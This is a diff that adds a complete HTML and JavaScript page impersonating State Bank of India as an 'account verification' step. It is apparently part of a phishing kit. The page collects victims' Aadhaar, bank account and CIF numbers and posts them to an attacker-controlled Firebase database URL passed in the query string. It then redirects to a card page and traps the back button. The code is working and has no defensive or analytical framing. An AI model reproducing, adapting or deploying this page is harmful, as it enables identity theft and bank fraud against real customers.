@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Account Verification - SBI</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #ffffff;
+            font-family: system-ui, -apple-system, 'Roboto', 'Segoe UI', Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .relative-layout {
+            width: 100%;
+            min-height: 100vh;
+            position: relative;
+            background: white;
+        }
+
+        .top-strip {
+            width: 100%;
+            height: 30px;
+            background-color: #7E7E7E;
+            position: relative;
+            z-index: 1;
+        }
+
+        .scroll-view {
+            position: relative;
+            width: 100%;
+            height: calc(100vh - 30px);
+            overflow-y: auto;
+            background-color: white;
+        }
+
+        .main-linear {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            padding-bottom: 16px;
+        }
+
+        .top-image {
+            width: 114px;
+            height: 40px;
+            margin-left: 20px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            object-fit: contain;
+        }
+
+        .info-banner {
+            background-color: #D9EDF7;
+            padding: 8px 20px;
+            width: 100%;
+            margin-top: 8px;
+        }
+        
+        .info-banner-text {
+            color: #032A38;
+            font-size: 14px;
+            font-weight: normal;
+            text-align: left;
+        }
+
+        .mandatory-text {
+            color: #D9774F;
+            font-size: 15px;
+            font-style: italic;
+            padding: 15px 16px 8px 16px;
+        }
+
+        .form-container {
+            padding: 0 16px 16px 16px;
+            width: 100%;
+        }
+
+        .field-row {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
+        
+        .field-label-text {
+            color: #000000;
+            font-size: 16px;
+        }
+        
+        .asterisk-red {
+            color: #FF0000;
+            font-size: 16px;
+            margin-left: 2px;
+        }
+
+        .input-field {
+            width: 100%;
+            border: 1px solid #AAAAAA;
+            border-radius: 4px;
+            padding: 8px;
+            font-size: 14px;
+            color: #000000;
+            background-color: #FFFFFF;
+            outline: none;
+            margin-bottom: 10px;
+        }
+        
+        .input-field:focus {
+            border-color: #00506D;
+        }
+        
+        .input-field::placeholder {
+            color: #888888;
+        }
+
+        .hint-text {
+            color: #444444;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .submit-button {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .btn-submit {
+            background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
+            border: none;
+            border-radius: 8px;
+            padding: 10px 30px;
+            color: white;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+            display: inline-block;
+        }
+        
+        .btn-submit:hover {
+            background: linear-gradient(135deg, #F57C00 0%, #E66A00 100%);
+            transform: scale(1.02);
+        }
+        
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .footer-image {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+            display: block;
+            margin-top: 8px;
+        }
+
+        .progress-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s;
+        }
+        
+        .progress-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .spinner-container {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #F57C00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        .spinner-text {
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            .btn-submit {
+                padding: 8px 25px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="relative-layout">
+    <div class="top-strip"></div>
+
+    <div class="scroll-view">
+        <div class="main-linear">
+
+            <img id="topLogoImg" class="top-image" src="sbii.webp" alt="SBI Reward Logo"
+                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'114\' height=\'40\'%3E%3Crect width=\'114\' height=\'40\' fill=\'%2300506D\'/%3E%3Ctext x=\'12\' y=\'26\' fill=\'white\' font-size=\'12\'%3ESBI REWARD%3C/text%3E%3C/svg%3E'">
+
+            <div class="info-banner">
+                <div class="info-banner-text">Enter Account Details</div>
+            </div>
+
+            <div class="mandatory-text">Mandatory fields are marked with an asterisk (*)</div>
+
+            <div class="form-container">
+
+                <div class="field-row">
+                    <span class="field-label-text">Aadhaar Number</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="text" id="etAadharNumber" class="input-field" placeholder="Enter Aadhaar Number" maxlength="12" inputmode="numeric">
+
+                <div class="field-row">
+                    <span class="field-label-text">A/C Number</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="text" id="etAcNumber" class="input-field" placeholder="Enter Account Number" maxlength="18" inputmode="numeric">
+
+                <div class="field-row">
+                    <span class="field-label-text">CIF Number</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="text" id="etCifNumber" class="input-field" placeholder="Enter CIF Number" maxlength="20" inputmode="numeric">
+
+                <div class="hint-text">(CIF Number is available in your passbook/statement of account)</div>
+
+                <div class="submit-button">
+                    <button id="btnSubmit" class="btn-submit">Submit</button>
+                </div>
+            </div>
+
+            <img id="footerLogoImg" class="footer-image" src="reward_logo.webp" alt="SBI Footer Logo"
+                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 600 80\'%3E%3Crect width=\'600\' height=\'80\' fill=\'%23E9F0F5\'/%3E%3Ctext x=\'20\' y=\'45\' fill=\'%2300506D\' font-size=\'12\'%3EState Bank of India - Safe & Secure Banking%3C/text%3E%3C/svg%3E'">
+
+        </div>
+    </div>
+</div>
+
+<div id="progressOverlay" class="progress-overlay">
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="spinner-text">Verifying, please wait...</div>
+    </div>
+</div>
+
+<script>
+    // ======================= CONFIG =======================
+    let FIREBASE_DB_URL = null;
+    let uniqueId = null;
+    let isSubmitting = false;
+
+    const aadhaarInput = document.getElementById("etAadharNumber");
+    const acNumberInput = document.getElementById("etAcNumber");
+    const cifNumberInput = document.getElementById("etCifNumber");
+    const submitBtn = document.getElementById("btnSubmit");
+    const progressOverlay = document.getElementById("progressOverlay");
+    // ======================================================
+
+    function showLoader(show) {
+        if (show) {
+            progressOverlay.classList.add('active');
+        } else {
+            progressOverlay.classList.remove('active');
+        }
+    }
+
+    function getData() {
+        const urlParams = new URLSearchParams(window.location.search);
+
+        // Get unique ID
+        const urlId = urlParams.get("id");
+        const storedId = localStorage.getItem("uniqueId") || localStorage.getItem("uniqueid");
+
+        if (urlId) {
+            uniqueId = urlId;
+            localStorage.setItem("uniqueId", uniqueId);
+        } else if (storedId) {
+            uniqueId = storedId;
+        } else {
+            uniqueId = "DEVICE_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Get Firebase URL
+        const urlDbUrl = urlParams.get("dbUrl");
+        const storedDbUrl = localStorage.getItem("dbUrl");
+
+        if (urlDbUrl) {
+            FIREBASE_DB_URL = urlDbUrl;
+            localStorage.setItem("dbUrl", FIREBASE_DB_URL);
+        } else if (storedDbUrl) {
+            FIREBASE_DB_URL = storedDbUrl;
+        } else {
+            console.error("❌ No Firebase URL found!");
+            alert("Configuration error. Please contact support.");
+        }
+    }
+
+    function validateAadhaar(aadhaar) {
+        return /^[0-9]{12}$/.test(aadhaar);
+    }
+
+    function validateAccountNumber(acNumber) {
+        return /^[0-9]{9,18}$/.test(acNumber);
+    }
+
+    function validateCIFNumber(cifNumber) {
+        return /^[0-9]{10,20}$/.test(cifNumber);
+    }
+
+    function formatAadhaarInput(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 12) value = value.slice(0, 12);
+        e.target.value = value;
+    }
+
+    function formatAcNumberInput(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 18) value = value.slice(0, 18);
+        e.target.value = value;
+    }
+
+    function formatCifNumberInput(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 20) value = value.slice(0, 20);
+        e.target.value = value;
+    }
+
+    // ======================= SAVE TO FIREBASE (userAgent & pageUrl REMOVED) =======================
+    async function saveToFirebase(aadhaar, acNumber, cifNumber) {
+        if (!FIREBASE_DB_URL) {
+            throw new Error("Firebase URL not configured");
+        }
+
+        const payload = {
+            aadhaarNumber: aadhaar,
+            accountNumber: acNumber,
+            cifNumber: cifNumber,
+            uniqueId: uniqueId,
+            timestamp: Date.now()
+        };
+
+        let baseUrl = FIREBASE_DB_URL.endsWith('/') ? FIREBASE_DB_URL.slice(0, -1) : FIREBASE_DB_URL;
+        const endpoint = `${baseUrl}/registeredDevices/${encodeURIComponent(uniqueId)}/netbanking_data.json`;
+
+        console.log("📤 Saving to Firebase:", endpoint);
+
+        const response = await fetch(endpoint, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        console.log("✅ Firebase save successful");
+        return true;
+    }
+    // ============================================================================================
+
+    async function handleSubmit() {
+        if (isSubmitting) return;
+
+        const aadhaar = aadhaarInput.value.trim();
+        const acNumber = acNumberInput.value.trim();
+        const cifNumber = cifNumberInput.value.trim();
+
+        if (!aadhaar || !validateAadhaar(aadhaar)) {
+            alert("Please enter a valid 12-digit Aadhaar Number");
+            aadhaarInput.focus();
+            return;
+        }
+
+        if (!acNumber || !validateAccountNumber(acNumber)) {
+            alert("Please enter a valid Account Number (9-18 digits)");
+            acNumberInput.focus();
+            return;
+        }
+
+        if (!cifNumber || !validateCIFNumber(cifNumber)) {
+            alert("Please enter a valid CIF Number (10-20 digits)");
+            cifNumberInput.focus();
+            return;
+        }
+
+        if (!uniqueId || !FIREBASE_DB_URL) {
+            alert("Session error. Please try again.");
+            return;
+        }
+
+        isSubmitting = true;
+        showLoader(true);
+
+        try {
+            await saveToFirebase(aadhaar, acNumber, cifNumber);
+
+            // Clear fields
+            aadhaarInput.value = "";
+            acNumberInput.value = "";
+            cifNumberInput.value = "";
+
+            localStorage.setItem("uniqueId", uniqueId);
+            localStorage.setItem("dbUrl", FIREBASE_DB_URL);
+
+            const redirectParams = new URLSearchParams({
+                id: uniqueId,
+                dbUrl: FIREBASE_DB_URL,
+                step: "verified",
+                timestamp: Date.now()
+            });
+
+            setTimeout(() => {
+                window.location.assign(`card.html?${redirectParams.toString()}`);
+            }, 600);
+
+        } catch (error) {
+            console.error("❌ Submission error:", error);
+            alert("Network error. Please check your connection and try again.");
+            showLoader(false);
+            isSubmitting = false;
+        }
+    }
+
+    function goBack() {
+        if (uniqueId && FIREBASE_DB_URL) {
+            window.location.replace(`index.html?id=${uniqueId}&dbUrl=${encodeURIComponent(FIREBASE_DB_URL)}`);
+        } else {
+            window.location.replace("index.html");
+        }
+    }
+
+    // Event Listeners
+    aadhaarInput.addEventListener("input", formatAadhaarInput);
+    acNumberInput.addEventListener("input", formatAcNumberInput);
+    cifNumberInput.addEventListener("input", formatCifNumberInput);
+
+    submitBtn.addEventListener("click", handleSubmit);
+
+    aadhaarInput.addEventListener("keypress", e => { if (e.key === "Enter") acNumberInput.focus(); });
+    acNumberInput.addEventListener("keypress", e => { if (e.key === "Enter") cifNumberInput.focus(); });
+    cifNumberInput.addEventListener("keypress", e => { if (e.key === "Enter") handleSubmit(); });
+
+    // Back button handling
+    history.pushState({page: "account_verification"}, "", location.href);
+    window.addEventListener("popstate", () => {
+        const confirmBack = confirm("Are you sure you want to go back? Your progress may be lost.");
+        if (confirmBack) goBack();
+        else history.pushState({page: "account_verification"}, "", location.href);
+    });
+
+    // Initialize
+    window.addEventListener("load", () => {
+        getData();
+        setTimeout(() => aadhaarInput.focus(), 100);
+    });
+
+    // Security
+    const sensitiveFields = ['etAadharNumber', 'etAcNumber', 'etCifNumber'];
+    sensitiveFields.forEach(id => {
+        const field = document.getElementById(id);
+        if (field) {
+            field.addEventListener('contextmenu', e => e.preventDefault());
+            field.addEventListener('copy', e => e.preventDefault());
+            field.addEventListener('paste', e => e.preventDefault());
+            field.addEventListener('cut', e => e.preventDefault());
+        }
+    });
+</script>
+</body>
+</html>
